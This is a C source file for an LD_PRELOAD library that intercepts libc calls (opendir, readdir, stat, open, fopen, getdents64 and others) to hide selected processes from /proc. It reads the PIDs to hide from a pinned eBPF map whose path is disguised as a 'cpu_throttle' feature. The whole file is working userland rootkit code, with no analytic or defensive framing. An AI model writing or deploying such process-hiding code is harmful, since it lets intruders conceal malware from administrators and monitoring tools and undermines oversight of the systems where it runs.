#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/stat.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <stdarg.h>
#include <regex.h>
#include <sys/syscall.h>
#include <time.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>

/* =====================================================
 *  LD_PRELOAD Cloak Library for Proc Filesystem Protection
 *  Layer-2: Userspace LD_PRELOAD Cloak for Process Hiding
 * ===================================================== */

/* Constants */
#define MAX_HIDDEN_PIDS 1024
#define PROC_PATH_PREFIX "/proc/"
#define BPF_MAP_PATH "/sys/fs/bpf/cpu_throttle/hidden_pid_map"

/* Global state */
static int initialized = 0;
static int hidden_pids[MAX_HIDDEN_PIDS];
static int hidden_count = 0;
static int bpf_map_fd = -1;
static time_t last_refresh = 0;
static const int REFRESH_INTERVAL = 5; /* Refresh every 5 seconds */

/* Original function pointers */
static DIR* (*real_opendir)(const char *name) = NULL;
static struct dirent* (*real_readdir)(DIR *dirp) = NULL;
static struct dirent64* (*real_readdir64)(DIR *dirp) = NULL;
static int (*real_stat)(const char *pathname, struct stat *statbuf) = NULL;
static int (*real_lstat)(const char *pathname, struct stat *statbuf) = NULL;
static int (*real_open)(const char *pathname, int flags, ...) = NULL;
static int (*real_openat)(int dirfd, const char *pathname, int flags, ...) = NULL;
static int (*real_access)(const char *pathname, int mode) = NULL;
static int (*real_faccessat)(int dirfd, const char *pathname, int mode, int flags) = NULL;
static FILE* (*real_fopen)(const char *pathname, const char *mode) = NULL;
static int (*real_fstatat)(int dirfd, const char *pathname, struct stat *statbuf, int flags) = NULL;
static long (*real_getdents64)(int fd, void *dirp, size_t count) = NULL;

/* =====================================================
 *  Function Prototypes
 * ===================================================== */

static long filter_getdents64_entries(void *dirp, long bytes_read);
static void load_hidden_pids_from_bpf_map(void);
static int open_bpf_map(void);
static int refresh_hidden_pids_if_needed(void);
static void close_bpf_map(void);

/* =====================================================
 *  Helper Functions
 * ===================================================== */

/* Open BPF map file descriptor */
static int open_bpf_map(void) {
    if (bpf_map_fd >= 0) {
        return bpf_map_fd; /* Already open */
    }

    /* Try to open pinned BPF map */
    bpf_map_fd = bpf_obj_get(BPF_MAP_PATH);
    if (bpf_map_fd < 0) {
        /* Map not available - this is normal if eBPF program not loaded */
        return -1;
    }

    return bpf_map_fd;
}

/* Close BPF map file descriptor */
static void close_bpf_map(void) {
    if (bpf_map_fd >= 0) {
        close(bpf_map_fd);
        bpf_map_fd = -1;
    }
}

/* Refresh hidden PIDs if needed (time-based) */
static int refresh_hidden_pids_if_needed(void) {
    time_t current_time = time(NULL);

    /* Check if refresh is needed */
    if (current_time - last_refresh < REFRESH_INTERVAL) {
        return 0; /* No refresh needed */
    }

    /* Update last refresh time */
    last_refresh = current_time;

    /* Reload PIDs from BPF map */
    load_hidden_pids_from_bpf_map();

    return 1; /* Refresh performed */
}

/* Initialize library and load hidden PIDs from BPF map */
static void init_libhide(void) {
    if (initialized) return;
    
    /* Load original functions */
    real_opendir = dlsym(RTLD_NEXT, "opendir");
    real_readdir = dlsym(RTLD_NEXT, "readdir");
    real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    real_stat = dlsym(RTLD_NEXT, "stat");
    real_lstat = dlsym(RTLD_NEXT, "lstat");
    real_open = dlsym(RTLD_NEXT, "open");
    real_openat = dlsym(RTLD_NEXT, "openat");
    real_access = dlsym(RTLD_NEXT, "access");
    real_faccessat = dlsym(RTLD_NEXT, "faccessat");
    real_fopen = dlsym(RTLD_NEXT, "fopen");
    real_fstatat = dlsym(RTLD_NEXT, "fstatat");
    real_getdents64 = dlsym(RTLD_NEXT, "getdents64");
    
    /* Load hidden PIDs from BPF map */
    load_hidden_pids_from_bpf_map();
    
    initialized = 1;
}

/* Load hidden PIDs from BPF map using real libbpf integration */
static void load_hidden_pids_from_bpf_map(void) {
    hidden_count = 0;

    /* Try to open BPF map */
    if (open_bpf_map() < 0) {
        /* BPF map not available - fallback to empty list */
        return;
    }

    /* Iterate through BPF map to get all hidden PIDs */
    uint32_t key = 0;
    uint32_t next_key;
    uint32_t value;
    int ret;

    /* Get first key */
    ret = bpf_map_get_next_key(bpf_map_fd, NULL, &key);
    if (ret != 0) {
        /* Map is empty or error occurred */
        return;
    }

    /* Iterate through all keys in the map */
    do {
        /* Lookup value for current key */
        ret = bpf_map_lookup_elem(bpf_map_fd, &key, &value);
        if (ret == 0 && value == 1) {
            /* This PID is marked as hidden */
            if (hidden_count < MAX_HIDDEN_PIDS) {
                hidden_pids[hidden_count] = (int)key;
                hidden_count++;
            } else {
                /* Array is full - log warning but continue */
                break;
            }
        }

        /* Get next key */
        ret = bpf_map_get_next_key(bpf_map_fd, &key, &next_key);
        if (ret != 0) {
            break; /* No more keys */
        }
        key = next_key;

    } while (hidden_count < MAX_HIDDEN_PIDS);
}

/* Check if PID should be hidden with real-time refresh */
static int is_hidden_pid(int pid) {
    init_libhide();

    /* Refresh hidden PIDs from BPF map if needed */
    refresh_hidden_pids_if_needed();

    /* Check if PID is in hidden list */
    for (int i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) {
            return 1;
        }
    }
    return 0;
}

/* Check if path is /proc/[PID] */
static int is_proc_pid_path(const char *path) {
    if (!path || strncmp(path, PROC_PATH_PREFIX, strlen(PROC_PATH_PREFIX)) != 0) {
        return 0;
    }
    
    const char *pid_str = path + strlen(PROC_PATH_PREFIX);
    
    /* Check if it's all digits (PID) */
    for (int i = 0; pid_str[i] != '\0' && pid_str[i] != '/'; i++) {
        if (pid_str[i] < '0' || pid_str[i] > '9') {
            return 0;
        }
    }
    
    return 1;
}

/* Extract PID from /proc/[PID] path */
static int extract_pid_from_path(const char *path) {
    if (!is_proc_pid_path(path)) {
        return 0;
    }
    
    const char *pid_str = path + strlen(PROC_PATH_PREFIX);
    return atoi(pid_str);
}

/* Check if directory entry should be hidden */
static int should_hide_dirent(const char *name) {
    if (!name) return 0;
    
    /* Check if entry name is a PID (all digits) */
    for (int i = 0; name[i] != '\0'; i++) {
        if (name[i] < '0' || name[i] > '9') {
            return 0; /* Not a PID */
        }
    }
    
    int pid = atoi(name);
    return is_hidden_pid(pid);
}

/* =====================================================
 *  Intercepted Functions - Core Hiding Logic
 * ===================================================== */

/* Override opendir to block /proc/[PID] access */
DIR* opendir(const char *name) {
    init_libhide();
    
    if (is_proc_pid_path(name)) {
        int pid = extract_pid_from_path(name);
        if (is_hidden_pid(pid)) {
            errno = ENOENT;
            return NULL;
        }
    }
    
    return real_opendir(name);
}

/* Override readdir to filter out hidden PIDs from /proc listing */
struct dirent* readdir(DIR *dirp) {
    init_libhide();
    
    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (!should_hide_dirent(entry->d_name)) {
            return entry;
        }
        /* Skip hidden entries and continue reading */
    }
    
    return NULL; /* No more entries or all remaining are hidden */
}

/* Override readdir64 to filter out hidden PIDs from /proc listing */
struct dirent64* readdir64(DIR *dirp) {
    init_libhide();
    
    struct dirent64 *entry;
    while ((entry = real_readdir64(dirp)) != NULL) {
        if (!should_hide_dirent(entry->d_name)) {
            return entry;
        }
        /* Skip hidden entries and continue reading */
    }
    
    return NULL; /* No more entries or all remaining are hidden */
}

/* Override stat to return ENOENT for hidden processes */
int stat(const char *pathname, struct stat *statbuf) {
    init_libhide();
    
    if (is_proc_pid_path(pathname)) {
        int pid = extract_pid_from_path(pathname);
        if (is_hidden_pid(pid)) {
            errno = ENOENT;
            return -1;
        }
    }
    
    return real_stat(pathname, statbuf);
}

/* Override lstat to return ENOENT for hidden processes */
int lstat(const char *pathname, struct stat *statbuf) {
    init_libhide();
    
    if (is_proc_pid_path(pathname)) {
        int pid = extract_pid_from_path(pathname);
        if (is_hidden_pid(pid)) {
            errno = ENOENT;
            return -1;
        }
    }
    
    return real_lstat(pathname, statbuf);
}

/* Override open to return ENOENT for hidden process files */
int open(const char *pathname, int flags, ...) {
    init_libhide();
    
    if (is_proc_pid_path(pathname)) {
        int pid = extract_pid_from_path(pathname);
        if (is_hidden_pid(pid)) {
            errno = ENOENT;
            return -1;
        }
    }
    
    /* Handle variable arguments for mode */
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode_t mode = va_arg(args, mode_t);
        va_end(args);
        return real_open(pathname, flags, mode);
    }
    
    return real_open(pathname, flags);
}

/* Override openat to return ENOENT for hidden process files */
int openat(int dirfd, const char *pathname, int flags, ...) {
    init_libhide();

    if (is_proc_pid_path(pathname)) {
        int pid = extract_pid_from_path(pathname);
        if (is_hidden_pid(pid)) {
            errno = ENOENT;
            return -1;
        }
    }

    /* Handle variable arguments for mode */
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode_t mode = va_arg(args, mode_t);
        va_end(args);
        return real_openat(dirfd, pathname, flags, mode);
    }

    return real_openat(dirfd, pathname, flags);
}

/* Override access to return ENOENT for hidden processes */
int access(const char *pathname, int mode) {
    init_libhide();

    if (is_proc_pid_path(pathname)) {
        int pid = extract_pid_from_path(pathname);
        if (is_hidden_pid(pid)) {
            errno = ENOENT;
            return -1;
        }
    }

    return real_access(pathname, mode);
}

/* Override faccessat to return ENOENT for hidden processes */
int faccessat(int dirfd, const char *pathname, int mode, int flags) {
    init_libhide();

    if (is_proc_pid_path(pathname)) {
        int pid = extract_pid_from_path(pathname);
        if (is_hidden_pid(pid)) {
            errno = ENOENT;
            return -1;
        }
    }

    return real_faccessat(dirfd, pathname, mode, flags);
}

/* Override fopen to return NULL for hidden processes */
FILE* fopen(const char *pathname, const char *mode) {
    init_libhide();

    if (is_proc_pid_path(pathname)) {
        int pid = extract_pid_from_path(pathname);
        if (is_hidden_pid(pid)) {
            errno = ENOENT;
            return NULL;
        }
    }

    return real_fopen(pathname, mode);
}

/* Override fstatat (newfstatat) to return ENOENT for hidden processes */
int fstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags) {
    init_libhide();

    if (is_proc_pid_path(pathname)) {
        int pid = extract_pid_from_path(pathname);
        if (is_hidden_pid(pid)) {
            errno = ENOENT;
            return -1;
        }
    }

    return real_fstatat(dirfd, pathname, statbuf, flags);
}

/* Override getdents64 to filter out hidden PIDs */
long getdents64(int fd, void *dirp, size_t count) {
    init_libhide();

    /* Call original getdents64 first */
    long result = real_getdents64(fd, dirp, count);
    if (result <= 0) {
        return result;
    }

    /* Check if this is /proc directory */
    char fd_path[256];
    char proc_path[256];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);

    ssize_t len = readlink(fd_path, proc_path, sizeof(proc_path) - 1);
    if (len > 0) {
        proc_path[len] = '\0';

        /* If this is /proc directory, filter entries */
        if (strcmp(proc_path, "/proc") == 0) {
            return filter_getdents64_entries(dirp, result);
        }
    }

    return result;
}

/* Filter getdents64 entries to remove hidden PIDs */
static long filter_getdents64_entries(void *dirp, long bytes_read) {
    struct linux_dirent64 {
        unsigned long d_ino;
        long d_off;
        unsigned short d_reclen;
        unsigned char d_type;
        char d_name[];
    };

    char *buf = (char *)dirp;
    long pos = 0;
    long new_pos = 0;

    while (pos < bytes_read) {
        struct linux_dirent64 *entry = (struct linux_dirent64 *)(buf + pos);

        /* Check if this entry is a PID directory */
        int pid = 0;
        int is_pid_dir = 1;
        for (int i = 0; entry->d_name[i] != '\0'; i++) {
            if (entry->d_name[i] < '0' || entry->d_name[i] > '9') {
                is_pid_dir = 0;
                break;
            }
            pid = pid * 10 + (entry->d_name[i] - '0');
        }

        /* If this is not a hidden PID, keep the entry */
        if (!is_pid_dir || !is_hidden_pid(pid)) {
            if (new_pos != pos) {
                memmove(buf + new_pos, buf + pos, entry->d_reclen);
            }
            new_pos += entry->d_reclen;
        }

        pos += entry->d_reclen;
    }

    return new_pos;
}

/* =====================================================
 *  Library Constructor/Destructor
 * ===================================================== */

__attribute__((constructor))
void libhide_init(void) {
    init_libhide();
}

__attribute__((destructor))
void libhide_cleanup(void) {
    /* Close BPF map file descriptor */
    close_bpf_map();
}
